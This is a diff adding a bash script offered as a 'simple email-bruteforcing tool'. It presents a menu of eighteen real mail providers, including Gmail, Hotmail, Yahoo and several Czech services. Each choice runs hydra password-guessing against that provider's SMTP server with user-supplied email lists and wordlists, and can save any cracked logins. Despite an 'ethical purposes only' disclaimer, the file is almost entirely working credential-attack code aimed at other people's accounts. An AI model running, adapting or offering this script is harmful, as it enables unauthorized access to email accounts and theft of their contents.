@@ -1,0 +1,632 @@
+#!/bin/bash
+#   <=: INFO :=>
+# Author: James Rock
+# ! FOR ETHICAL PURPOSES ONLY !
+
+## COLORS
+
+## ROOT & INTERNET CHECK
+
+if [ "$EUID" -ne 0 ] && [ "$OSTYPE" = "linux-gnu"* ]; then
+
+	echo -e " \033[7;31m Run this as root! $nc"
+	exit 1
+else
+	wget -q --spider http://google.com
+
+	if [ ! $? -eq 0 ]; then
+
+		echo -e " \033[7;31m You are offline! $nc"
+		exit 1
+	fi
+fi
+
+
+
+red="\033[1;31m"
+green="\033[1;32m"
+on_green="\033[0;30m \033[42m"
+blue="\033[1;34m"
+white="\033[97m"
+nc="\e[0m"
+
+## BANNER
+
+clear
+echo -e "\n\n$red   ███████╗$nc       $green██████╗ ██████╗ ██╗   ██╗████████╗███████╗██████╗ "
+echo -e "$red   ██╔════╝$nc       $green██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗"
+echo -e "$red   █████╗  $nc$blue█████╗$nc $green██████╔╝██████╔╝██║   ██║   ██║   █████╗  ██████╔╝"
+echo -e "$red   ██╔══╝  $nc$blue╚════╝$nc $green██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══██╗"
+echo -e "$red   ███████╗$nc       $green██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║  ██║"
+echo -e "$red   ╚══════╝$nc       $green╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝"
+echo -e "\n                                              $white Simple$red Email$blue-"$green"Bruteforcing$white tool"
+echo -e "               "$light_grey"Author$red :$on_green W1ckedW0LF $nc\n"
+
+
+## OPTION MENU
+
+list=`echo -e "
+
+$white 1$red  :$blue Hotmail
+$white 2$red  :$blue Gmail
+$white 3$red  :$blue Yahoo
+$white 4$red  :$blue Yandex
+$white 5$red  :$blue Mail
+$white 6$red  :$blue Outlook
+$white 7$red  :$blue Aol
+$white 8$red  :$blue Email
+$white 9$red  :$blue Post
+$white 10$red :$blue Seznam
+$white 11$red :$blue Atlas
+$white 12$red :$blue Centrum
+$white 13$red :$blue Volny
+$white 14$red :$blue UPC
+$white 15$red :$blue Pipni
+$white 16$red :$blue O2
+$white 17$red :$blue Tiscali
+$white 18$red :$blue T-Mobile
+$nc"`
+
+echo -e "\n$list\n"
+
+read -e -p "$(echo -e "$red >>>$white ")" cislo
+
+## ACTION
+
+if [[ $cislo = 1 ]]; then
+  smtp1=smtp.live.com
+  echo ""
+  read -e -p "[HOTMAIL] [1] File with Emails / [2] Single Email : " file
+    if [ $file = 1 ]; then
+       read -e -p "[HOTMAIL] Enter the file location : " soubor
+       read -e -p "[HOTMAIL] Enter the wordlist location : " wordlist
+       read -e -p "[HOTMAIL] Do you want to store found logins? [Y/n] : " store
+	if [[ $store == "y" || $store == "Y" ]]; then
+	   read -e -p "[HOTMAIL] Enter the file location : " output
+	   echo -e "$nc"
+	   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp1 smtp
+	elif [[ $store == "n" || $store == "N" ]]; then
+	   echo -e "$nc"
+	   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp1 smtp
+   fi
+    elif [ $file = 2 ]; then
+	   read -e -p "[HOTMAIL] Enter Email : " email
+	   read -e -p "[HOTMAIL] Enter the wordlist location : " wordlist
+	   read -e -p "[HOTMAIL] Do you want to store found logins? [Y/n] : " store
+	if [[ $store == "y" || $store == "" ]]; then
+	  read -e -p "[HOTMAIL] Enter the file location : " output
+	  echo -e "$nc"
+	  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp1 smtp
+	elif [[ $store == "n" || $store == "N" ]]; then
+	  echo -e "$nc"
+	  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp1 smtp
+fi
+fi
+
+elif [[ $cislo = 2 ]]; then
+  smtp2=smtp.gmail.com
+  echo ""
+  read -e -p "[GMAIL] [1] File with Emails / [2] Single Email : " file
+    if [ $file = 1 ]; then
+       read -e -p "[GMAIL] Enter the file location : " soubor
+       read -e -p "[GMAIL] Enter the wordlist location : " wordlist
+       read -e -p "[GMAIL] Do you want to store found logins? [Y/n] : " store
+	if [[ $store == "y" || $store == "Y" ]]; then
+	   read -e -p "[GMAIL] Enter the file location : " output
+	   echo -e "$nc"
+	   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp2 smtp
+	elif [[ $store == "n" || $store == "N" ]]; then
+	   echo -e "$nc"
+	   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp2 smtp
+   fi
+    elif [ $file = 2 ]; then
+	   read -e -p "[GMAIL] Enter Email : " email
+	   read -e -p "[GMAIL] Enter the wordlist location : " wordlist
+	   read -e -p "[GMAIL] Do you want to store found logins? [Y/n] : " store
+	if [[ $store == "y" || $store == "" ]]; then
+	  read -e -p "[GMAIL] Enter the file location : " output
+	  echo -e "$nc"
+	  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp2 smtp
+	elif [[ $store == "n" || $store == "N" ]]; then
+	  echo -e "$nc"
+	  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp2 smtp
+fi
+fi
+
+elif [[ $cislo = 3 ]]; then
+  smtp3=smtp.mail.yahoo.com
+  echo ""
+  read -e -p "[YAHOO] [1] File with Emails / [2] Single Email : " file
+    if [ $file = 1 ]; then
+       read -e -p "[YAHOO] Enter the file location : " soubor
+       read -e -p "[YAHOO] Enter the wordlist location : " wordlist
+       read -e -p "[YAHOO] Do you want to store found logins? [Y/n] : " store
+	if [[ $store == "y" || $store == "Y" ]]; then
+	   read -e -p "[YAHOO] Enter the file location : " output
+	   echo -e "$nc"
+	   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp3 smtp
+	elif [[ $store == "n" || $store == "N" ]]; then
+	   echo -e "$nc"
+	   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp3 smtp
+   fi
+    elif [ $file = 2 ]; then
+	   read -e -p "[YAHOO] Enter Email : " email
+	   read -e -p "[YAHOO] Enter the wordlist location : " wordlist
+	   read -e -p "[YAHOO] Do you want to store found logins? [Y/n] : " store
+	if [[ $store == "y" || $store == "" ]]; then
+	  read -e -p "[YAHOO] Enter the file location : " output
+	  echo -e "$nc"
+	  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp3 smtp
+	elif [[ $store == "n" || $store == "N" ]]; then
+	  echo -e "$nc"
+	  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp3 smtp
+fi
+fi
+
+elif [[ $cislo = 4 ]]; then
+  smtp4=smtp.yandex.com
+  echo ""
+  read -e -p "[YANDEX] [1] File with Emails / [2] Single Email : " file
+    if [ $file = 1 ]; then
+       read -e -p "[YANDEX] Enter the file location : " soubor
+       read -e -p "[YANDEX] Enter the wordlist location : " wordlist
+       read -e -p "[YANDEX] Do you want to store found logins? [Y/n] : " store
+	if [[ $store == "y" || $store == "Y" ]]; then
+	   read -e -p "[YANDEX] Enter the file location : " output
+	   echo -e "$nc"
+	   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp4 smtp
+	elif [[ $store == "n" || $store == "N" ]]; then
+	   echo -e "$nc"
+	   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp4 smtp
+   fi
+    elif [ $file = 2 ]; then
+	   read -e -p "[YANDEX] Enter Email : " email
+	   read -e -p "[YANDEX] Enter the wordlist location : " wordlist
+	   read -e -p "[YANDEX] Do you want to store found logins? [Y/n] : " store
+	if [[ $store == "y" || $store == "" ]]; then
+	  read -e -p "[YANDEX] Enter the file location : " output
+	  echo -e "$nc"
+	  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp4 smtp
+	elif [[ $store == "n" || $store == "N" ]]; then
+	  echo -e "$nc"
+	  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp4 smtp
+fi
+fi
+
+elif [[ $cislo = 5 ]]; then
+  smtp5=smtp.mail.com
+  echo ""
+read -e -p "[MAIL] [1] File with Emails / [2] Single Email : " file
+  if [ $file = 1 ]; then
+     read -e -p "[MAIL] Enter the file location : " soubor
+     read -e -p "[MAIL] Enter the wordlist location : " wordlist
+     read -e -p "[MAIL] Do you want to store found logins? [Y/n] : " store
+if [[ $store == "y" || $store == "Y" ]]; then
+   read -e -p "[MAIL] Enter the file location : " output
+   echo -e "$nc"
+   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp5 smtp
+elif [[ $store == "n" || $store == "N" ]]; then
+   echo -e "$nc"
+   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp5 smtp
+ fi
+  elif [ $file = 2 ]; then
+   read -e -p "[MAIL] Enter Email : " email
+   read -e -p "[MAIL] Enter the wordlist location : " wordlist
+   read -e -p "[MAIL] Do you want to store found logins? [Y/n] : " store
+if [[ $store == "y" || $store == "" ]]; then
+  read -e -p "[MAIL] Enter the file location : " output
+  echo -e "$nc"
+  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp5 smtp
+elif [[ $store == "n" || $store == "N" ]]; then
+  echo -e "$nc"
+  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp5 smtp
+fi
+fi
+
+elif [[ $cislo = 6 ]]; then
+  smtp6=smtp-mail.outlook.com
+  echo ""
+read -e -p "[OUTLOOK] [1] File with Emails / [2] Single Email : " file
+  if [ $file = 1 ]; then
+     read -e -p "[OUTLOOK] Enter the file location : " soubor
+     read -e -p "[OUTLOOK] Enter the wordlist location : " wordlist
+     read -e -p "[OUTLOOK] Do you want to store found logins? [Y/n] : " store
+if [[ $store == "y" || $store == "Y" ]]; then
+   read -e -p "[OUTLOOK] Enter the file location : " output
+   echo -e "$nc"
+   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp6 smtp
+elif [[ $store == "n" || $store == "N" ]]; then
+   echo -e "$nc"
+   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp6 smtp
+ fi
+  elif [ $file = 2 ]; then
+   read -e -p "[OUTLOOK] Enter Email : " email
+   read -e -p "[OUTLOOK] Enter the wordlist location : " wordlist
+   read -e -p "[OUTLOOK] Do you want to store found logins? [Y/n] : " store
+if [[ $store == "y" || $store == "" ]]; then
+  read -e -p "[OUTLOOK] Enter the file location : " output
+  echo -e "$nc"
+  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp6 smtp
+elif [[ $store == "n" || $store == "N" ]]; then
+  echo -e "$nc"
+  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp6 smtp
+fi
+fi
+
+elif [[ $cislo = 7 ]]; then
+  smtp7=smtp.aol.com
+  echo ""
+read -e -p "[AOL] [1] File with Emails / [2] Single Email : " file
+  if [ $file = 1 ]; then
+     read -e -p "[AOL] Enter the file location : " soubor
+     read -e -p "[AOL] Enter the wordlist location : " wordlist
+     read -e -p "[AOL] Do you want to store found logins? [Y/n] : " store
+if [[ $store == "y" || $store == "Y" ]]; then
+   read -e -p "[AOL] Enter the file location : " output
+   echo -e "$nc"
+   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp7 smtp
+elif [[ $store == "n" || $store == "N" ]]; then
+   echo -e "$nc"
+   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp7 smtp
+ fi
+  elif [ $file = 2 ]; then
+   read -e -p "[AOL] Enter Email : " email
+   read -e -p "[AOL] Enter the wordlist location : " wordlist
+   read -e -p "[AOL] Do you want to store found logins? [Y/n] : " store
+if [[ $store == "y" || $store == "" ]]; then
+  read -e -p "[AOL] Enter the file location : " output
+  echo -e "$nc"
+  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp7 smtp
+elif [[ $store == "n" || $store == "N" ]]; then
+  echo -e "$nc"
+  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp7 smtp
+fi
+fi
+
+elif [[ $cislo = 8 ]]; then
+  smtp8=smtp.email.com
+  echo ""
+read -e -p "[EMAIL] [1] File with Emails / [2] Single Email : " file
+  if [ $file = 1 ]; then
+     read -e -p "[EMAIL] Enter the file location : " soubor
+     read -e -p "[EMAIL] Enter the wordlist location : " wordlist
+     read -e -p "[EMAIL] Do you want to store found logins? [Y/n] : " store
+if [[ $store == "y" || $store == "Y" ]]; then
+   read -e -p "[EMAIL] Enter the file location : " output
+   echo -e "$nc"
+   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp8 smtp
+elif [[ $store == "n" || $store == "N" ]]; then
+   echo -e "$nc"
+   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp8 smtp
+ fi
+  elif [ $file = 2 ]; then
+   read -e -p "[EMAIL] Enter Email : " email
+   read -e -p "[EMAIL] Enter the wordlist location : " wordlist
+   read -e -p "[EMAIL] Do you want to store found logins? [Y/n] : " store
+if [[ $store == "y" || $store == "" ]]; then
+  read -e -p "[EMAIL] Enter the file location : " output
+  echo -e "$nc"
+  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp8 smtp
+elif [[ $store == "n" || $store == "N" ]]; then
+  echo -e "$nc"
+  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp8 smtp
+fi
+fi
+
+elif [[ $cislo = 9 ]]; then
+  smtp9=smtp.post.com
+  echo ""
+read -e -p "[POST] [1] File with Emails / [2] Single Email : " file
+  if [ $file = 1 ]; then
+     read -e -p "[POST] Enter the file location : " soubor
+     read -e -p "[POST] Enter the wordlist location : " wordlist
+     read -e -p "[POST] Do you want to store found logins? [Y/n] : " store
+if [[ $store == "y" || $store == "Y" ]]; then
+   read -e -p "[T-MOBILE] Enter the file location : " output
+   echo -e "$nc"
+   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp9 smtp
+elif [[ $store == "n" || $store == "N" ]]; then
+   echo -e "$nc"
+   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp9 smtp
+ fi
+  elif [ $file = 2 ]; then
+   read -e -p "[POST] Enter Email : " email
+   read -e -p "[POST] Enter the wordlist location : " wordlist
+   read -e -p "[POST] Do you want to store found logins? [Y/n] : " store
+if [[ $store == "y" || $store == "" ]]; then
+  read -e -p "[POST] Enter the file location : " output
+  echo -e "$nc"
+  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp9 smtp
+elif [[ $store == "n" || $store == "N" ]]; then
+  echo -e "$nc"
+  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp9 smtp
+fi
+fi
+
+## CZECH
+
+
+elif [[ $cislo = 10 ]]; then
+  smtp10=smtp.seznam.cz
+  echo ""
+  read -e -p "[SEZNAM] [1] File with Emails / [2] Single Email : " file
+    if [ $file = 1 ]; then
+       read -e -p "[SEZNAM] Enter the file location : " soubor
+       read -e -p "[SEZNAM] Enter the wordlist location : " wordlist
+       read -e -p "[SEZNAM] Do you want to store found logins? [Y/n] : " store
+	if [[ $store == "y" || $store == "Y" ]]; then
+	   read -e -p "[SEZNAM] Enter the file location : " output
+	   echo -e "$nc"
+	   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp10 smtp
+	elif [[ $store == "n" || $store == "N" ]]; then
+	   echo -e "$nc"
+	   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp10 smtp
+   fi
+    elif [ $file = 2 ]; then
+	   read -e -p "[SEZNAM] Enter Email : " email
+	   read -e -p "[SEZNAM] Enter the wordlist location : " wordlist
+	   read -e -p "[SEZNAM] Do you want to store found logins? [Y/n] : " store
+	if [[ $store == "y" || $store == "" ]]; then
+	  read -e -p "[SEZNAM] Enter the file location : " output
+	  echo -e "$nc"
+	  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp10 smtp
+	elif [[ $store == "n" || $store == "N" ]]; then
+	  echo -e "$nc"
+	  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp10 smtp
+fi
+fi
+
+elif [[ $cislo = 11 ]]; then
+  smtp11=smtp.atlas.cz
+  echo ""
+  read -e -p "[ATLAS] [1] File with Emails / [2] Single Email : " file
+    if [ $file = 1 ]; then
+       read -e -p "[ATLAS] Enter the file location : " soubor
+       read -e -p "[ATLAS] Enter the wordlist location : " wordlist
+       read -e -p "[ATLAS] Do you want to store found logins? [Y/n] : " store
+	if [[ $store == "y" || $store == "Y" ]]; then
+	   read -e -p "[ATLAS] Enter the file location : " output
+	   echo -e "$nc"
+	   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp11 smtp
+	elif [[ $store == "n" || $store == "N" ]]; then
+	   echo -e "$nc"
+	   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp11 smtp
+   fi
+    elif [ $file = 2 ]; then
+	   read -e -p "[ATLAS] Enter Email : " email
+	   read -e -p "[ATLAS] Enter the wordlist location : " wordlist
+	   read -e -p "[ATLAS] Do you want to store found logins? [Y/n] : " store
+	if [[ $store == "y" || $store == "" ]]; then
+	  read -e -p "[ATLAS] Enter the file location : " output
+	  echo -e "$nc"
+	  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp11 smtp
+	elif [[ $store == "n" || $store == "N" ]]; then
+	  echo -e "$nc"
+	  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp11 smtp
+fi
+fi
+
+elif [[ $cislo = 12 ]]; then
+  smtp12=smtp.centrum.cz
+  echo ""
+  read -e -p "[CENTRUM] [1] File with Emails / [2] Single Email : " file
+    if [ $file = 1 ]; then
+       read -e -p "[CENTRUM] Enter the file location : " soubor
+       read -e -p "[CENTRUM] Enter the wordlist location : " wordlist
+       read -e -p "[CENTRUM] Do you want to store found logins? [Y/n] : " store
+	if [[ $store == "y" || $store == "Y" ]]; then
+	   read -e -p "[CENTRUM] Enter the file location : " output
+	   echo -e "$nc"
+	   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp12 smtp
+	elif [[ $store == "n" || $store == "N" ]]; then
+	   echo -e "$nc"
+	   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp12 smtp
+   fi
+    elif [ $file = 2 ]; then
+	   read -e -p "[CENTRUM] Enter Email : " email
+	   read -e -p "[CENTRUM] Enter the wordlist location : " wordlist
+	   read -e -p "[CENTRUM] Do you want to store found logins? [Y/n] : " store
+	if [[ $store == "y" || $store == "" ]]; then
+	  read -e -p "[CENTRUM] Enter the file location : " output
+	  echo -e "$nc"
+	  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp12 smtp
+	elif [[ $store == "n" || $store == "N" ]]; then
+	  echo -e "$nc"
+	  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp12 smtp
+fi
+fi
+
+elif [[ $cislo = 13 ]]; then
+  smtp13=smtp.volny.cz
+  echo ""
+  read -e -p "[VOLNY] [1] File with Emails / [2] Single Email : " file
+    if [ $file = 1 ]; then
+       read -e -p "[VOLNY] Enter the file location : " soubor
+       read -e -p "[VOLNY] Enter the wordlist location : " wordlist
+       read -e -p "[VOLNY] Do you want to store found logins? [Y/n] : " store
+	if [[ $store == "y" || $store == "Y" ]]; then
+	   read -e -p "[VOLNY] Enter the file location : " output
+	   echo -e "$nc"
+	   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp13 smtp
+	elif [[ $store == "n" || $store == "N" ]]; then
+	   echo -e "$nc"
+	   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp13 smtp
+   fi
+    elif [ $file = 2 ]; then
+	   read -e -p "[VOLNY] Enter Email : " email
+	   read -e -p "[VOLNY] Enter the wordlist location : " wordlist
+	   read -e -p "[VOLNY] Do you want to store found logins? [Y/n] : " store
+	if [[ $store == "y" || $store == "" ]]; then
+	  read -e -p "[VOLNY] Enter the file location : " output
+	  echo -e "$nc"
+	  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp13 smtp
+	elif [[ $store == "n" || $store == "N" ]]; then
+	  echo -e "$nc"
+	  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp13 smtp
+fi
+fi
+
+elif [[ $cislo = 14 ]]; then
+  smtp14=smtp.upcmail.cz
+  echo ""
+read -e -p "[UPC] [1] File with Emails / [2] Single Email : " file
+  if [ $file = 1 ]; then
+     read -e -p "[UPC] Enter the file location : " soubor
+     read -e -p "[UPC] Enter the wordlist location : " wordlist
+     read -e -p "[UPC] Do you want to store found logins? [Y/n] : " store
+if [[ $store == "y" || $store == "Y" ]]; then
+   read -e -p "[UPC] Enter the file location : " output
+   echo -e "$nc"
+   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp14 smtp
+elif [[ $store == "n" || $store == "N" ]]; then
+   echo -e "$nc"
+   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp14 smtp
+ fi
+  elif [ $file = 2 ]; then
+   read -e -p "[UPC] Enter Email : " email
+   read -e -p "[UPC] Enter the wordlist location : " wordlist
+   read -e -p "[UPC] Do you want to store found logins? [Y/n] : " store
+if [[ $store == "y" || $store == "" ]]; then
+  read -e -p "[UPC] Enter the file location : " output
+  echo -e "$nc"
+  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp14 smtp
+elif [[ $store == "n" || $store == "N" ]]; then
+  echo -e "$nc"
+  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp14 smtp
+fi
+fi
+
+elif [[ $cislo = 15 ]]; then
+  smtp15=smtp.pipni.cz
+  echo ""
+read -e -p "[PIPNI] [1] File with Emails / [2] Single Email : " file
+  if [ $file = 1 ]; then
+     read -e -p "[PIPNI] Enter the file location : " soubor
+     read -e -p "[PIPNI] Enter the wordlist location : " wordlist
+     read -e -p "[PIPNI] Do you want to store found logins? [Y/n] : " store
+if [[ $store == "y" || $store == "Y" ]]; then
+   read -e -p "[PIPNI] Enter the file location : " output
+   echo -e "$nc"
+   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp15 smtp
+elif [[ $store == "n" || $store == "N" ]]; then
+   echo -e "$nc"
+   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp15 smtp
+ fi
+  elif [ $file = 2 ]; then
+   read -e -p "[PIPNI] Enter Email : " email
+   read -e -p "[PIPNI] Enter the wordlist location : " wordlist
+   read -e -p "[PIPNI] Do you want to store found logins? [Y/n] : " store
+if [[ $store == "y" || $store == "" ]]; then
+  read -e -p "[PIPNI] Enter the file location : " output
+  echo -e "$nc"
+  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp15 smtp
+elif [[ $store == "n" || $store == "N" ]]; then
+  echo -e "$nc"
+  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp15 smtp
+fi
+fi
+
+elif [[ $cislo = 16 ]]; then
+  smtp16=smtp.etmail.cz
+  echo ""
+read -e -p "[O2] [1] File with Emails / [2] Single Email : " file
+  if [ $file = 1 ]; then
+     read -e -p "[O2] Enter the file location : " soubor
+     read -e -p "[O2] Enter the wordlist location : " wordlist
+     read -e -p "[O2] Do you want to store found logins? [Y/n] : " store
+if [[ $store == "y" || $store == "Y" ]]; then
+   read -e -p "[O2] Enter the file location : " output
+   echo -e "$nc"
+   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp16 smtp
+elif [[ $store == "n" || $store == "N" ]]; then
+   echo -e "$nc"
+   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp16 smtp
+ fi
+  elif [ $file = 2 ]; then
+   read -e -p "[O2] Enter Email : " email
+   read -e -p "[O2] Enter the wordlist location : " wordlist
+   read -e -p "[O2] Do you want to store found logins? [Y/n] : " store
+if [[ $store == "y" || $store == "" ]]; then
+  read -e -p "[O2] Enter the file location : " output
+  echo -e "$nc"
+  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp16 smtp
+elif [[ $store == "n" || $store == "N" ]]; then
+  echo -e "$nc"
+  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp16 smtp
+fi
+fi
+
+elif [[ $cislo = 17 ]]; then
+  smtp17=smtp.tiscali.cz
+  echo ""
+read -e -p "[TISCALI] [1] File with Emails / [2] Single Email : " file
+  if [ $file = 1 ]; then
+     read -e -p "[TISCALI] Enter the file location : " soubor
+     read -e -p "[TISCALI] Enter the wordlist location : " wordlist
+     read -e -p "[TISCALI] Do you want to store found logins? [Y/n] : " store
+if [[ $store == "y" || $store == "Y" ]]; then
+   read -e -p "[TISCALI] Enter the file location : " output
+   echo -e "$nc"
+   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp17 smtp
+elif [[ $store == "n" || $store == "N" ]]; then
+   echo -e "$nc"
+   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp17 smtp
+ fi
+  elif [ $file = 2 ]; then
+   read -e -p "[TISCALI] Enter Email : " email
+   read -e -p "[TISCALI] Enter the wordlist location : " wordlist
+   read -e -p "[TISCALI] Do you want to store found logins? [Y/n] : " store
+if [[ $store == "y" || $store == "" ]]; then
+  read -e -p "[TISCALI] Enter the file location : " output
+  echo -e "$nc"
+  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp17 smtp
+elif [[ $store == "n" || $store == "N" ]]; then
+  echo -e "$nc"
+  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp17 smtp
+fi
+fi
+
+elif [[ $cislo = 18 ]]; then
+  smtp18=smtp.t-email.cz
+  echo ""
+read -e -p "[T-MOBILE] [1] File with Emails / [2] Single Email : " file
+  if [ $file = 1 ]; then
+     read -e -p "[T-MOBILE] Enter the file location : " soubor
+     read -e -p "[T-MOBILE] Enter the wordlist location : " wordlist
+     read -e -p "[T-MOBILE] Do you want to store found logins? [Y/n] : " store
+if [[ $store == "y" || $store == "Y" ]]; then
+   read -e -p "[T-MOBILE] Enter the file location : " output
+   echo -e "$nc"
+   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp18 smtp
+elif [[ $store == "n" || $store == "N" ]]; then
+   echo -e "$nc"
+   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp18 smtp
+ fi
+  elif [ $file = 2 ]; then
+   read -e -p "[T-MOBILE] Enter Email : " email
+   read -e -p "[T-MOBILE] Enter the wordlist location : " wordlist
+   read -e -p "[T-MOBILE] Do you want to store found logins? [Y/n] : " store
+if [[ $store == "y" || $store == "" ]]; then
+  read -e -p "[T-MOBILE] Enter the file location : " output
+  echo -e "$nc"
+  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp18 smtp
+elif [[ $store == "n" || $store == "N" ]]; then
+  echo -e "$nc"
+  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp18 smtp
+fi
+fi
+
+elif [ -z $cislo ]; then
+
+	echo -e "\n$red Nevermind...$nc\n"
+	exit 0
+else
+ echo -e " \033[7;31m WRONG INPUT! $nc"
+exit 1
+
+fi
+#fi
+
+## THIS SCRIPT WAS MADE BY ME, NOT SO EXPERIENCED
+#
+#### I COULD EDIT THIS CRAZY LONG SCRIPT TO MAKE IT MORE HUMAN-READABLE BUT I AM LAZY ####
